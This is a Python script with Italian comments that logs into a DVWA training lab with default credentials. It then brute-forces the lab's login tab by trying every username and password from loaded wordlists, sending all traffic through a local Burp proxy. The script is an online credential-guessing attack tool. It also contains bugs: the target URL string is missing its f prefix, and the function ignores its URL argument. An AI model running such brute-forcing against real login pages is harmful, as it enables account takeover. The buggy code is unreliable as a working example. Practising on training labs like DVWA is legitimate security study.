import requests
from bs4 import BeautifulSoup
from bruteforcer_allFinal import *

# variabile globale per mantenere la sessione loggata
session = requests.Session()

#inserire qui ip dell'host
host = "192.168.50.101"

#proxy per mandare le richieste a burpsuite
proxies = {
	"http": "http://127.0.0.1:8080"
}

def check_dvwa_brutetab_credentials(URL, username, password, custom_headers):

	
	# Verifica lo stato della risposta
	#if response.status_code == 302 and response.headers.get('location').endswith('index.php'):
	
	params = {
		'username': username,
		'password': password,
		'Login': 'Login'
	}


	# provo a bruteforzare il tab
	r4 = session.get(url, headers=custom_headers, proxies=proxies, params=params, allow_redirects=False)
	
	if "Username and/or password incorrect." in r4.text:
		return False
	else:
		return True

if __name__ == "__main__":
	# -- example
	# print(check_credentials("username", "password"))
    	
	loginUrl = f'http://{host}/DVWA/login.php'
	
	data = {
		'username': 'admin',
		'password': 'password',
		'Login': 'Login'
	}
	# Effettua la richiesta POST per il login
	r1 = session.post(loginUrl, data=data, proxies=proxies, allow_redirects=False)
	phpsess = r1.cookies.get('PHPSESSID')
	sec = r1.cookies.get('security')
	custom_headers = {
		"Content-Type": "application/x-www-form-urlencoded",
		"Cookie": f"security={sec}; PHPSESSID={phpsess}",
	}
	print(f"Livello di difficoltà DVWA: {sec}")
	r2 = session.get(loginUrl, headers=custom_headers, proxies=proxies)
	
	usernames = []
	passwords = []
	usernames, passwords = loadFiles()
	url = 'http://{host}/DVWA/vulnerabilities/brute/'
	
	if "Login failed" in r2.text:
		print("Credenziali di default errate")
	else:	
		r3 = session.get(url, headers=custom_headers, proxies=proxies, allow_redirects=False)
		# -- for each user
		for user in usernames:
			# -- and for each password
			for password in passwords:
				
				if check_dvwa_brutetab_credentials(url, user, password, custom_headers):
					# se lo trovo smetto
					print(f"Login Riuscito con: ({user}:{password})")
					break
				else:
					print(f"Login fallito con: ({user}:{password})")


				# aggiungere qui altri check di metodi specifici
			
			else:
				continue
			break

